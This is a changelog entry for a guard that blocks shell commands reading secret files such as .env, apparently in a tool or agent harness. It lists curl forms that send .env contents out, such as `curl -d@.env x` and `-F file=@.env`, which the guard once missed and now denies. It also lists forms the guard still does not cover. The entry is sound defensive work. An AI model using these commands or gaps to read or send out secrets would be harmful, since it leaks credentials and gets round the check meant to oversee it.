**The secret-read guard blocks a secret file named inside a curl option value** — `curl -d @.env` was denied, but curl opens `.env` just the same for `curl -d@.env`, `curl -sd@.env`, `curl -F file=@.env`, `curl -F "file=<.env"`, `curl --data-urlencode k@.env` and `curl --cert .env:pw`, and those were allowed. The guard now reads curl's arguments as curl does wherever a command runs curl, also behind `sudo`, `xargs`, `find -exec` and the launchers it lists (`watch`, `npx`, `docker exec`, `uv run` and others), while a `curl` word that nothing runs leaves a pattern alone (`grep curl 'x@.env' f`). It also reads the command behind a shell keyword or a wrapper's assignment (`if true; then bash -c 'cat .env'; fi`, `! curl -d@.env x`, `sudo A=b curl -d@.env x`), on top of what it checked there before, so nothing it denied before is allowed now and `if [ -f .env ]; then …` stays denied. Some commands that read no secret are newly denied, among them a URL's `user@` part in `curl 'http://user@.env/'` and `curl -H 'Host: a@.env.com'`. Not covered: a curl the guard does not resolve as a command (`$'curl'`, `env -S 'curl …'`, `ssh host curl …`, `nix run nixpkgs#curl -- …`, `docker run curl:8.5.0`, a launcher, `xargs` or `find -exec` behind three levels of `xargs` or `find -exec`, `coproc`'s name in front of a compound command (`coproc x if curl …; then …`), a command it does not list as running another, or a command given as one string: `watch 'curl …'`, `find -exec sh -c 'curl …'`, `docker exec c sh -c 'curl …'`); zsh's short `if [[ a && b ]] cmd`, where a word of the test ends the guard's segment (`&&`, `||`, `(`, `{`, a newline); a file named inside a curl config (`-K cfg`, `-K -`); curl's `{a,b}` globbing in an upload or `file://` name; a name built from `--variable` values in an `--expand-*` option; the quote and backslash removal `xargs` applies to piped words; and, for a `--cert` value piped through `xargs`, a count of 1 written other than `1` (`-n01`) or BSD `xargs`'s `-I` rules. (#5779)
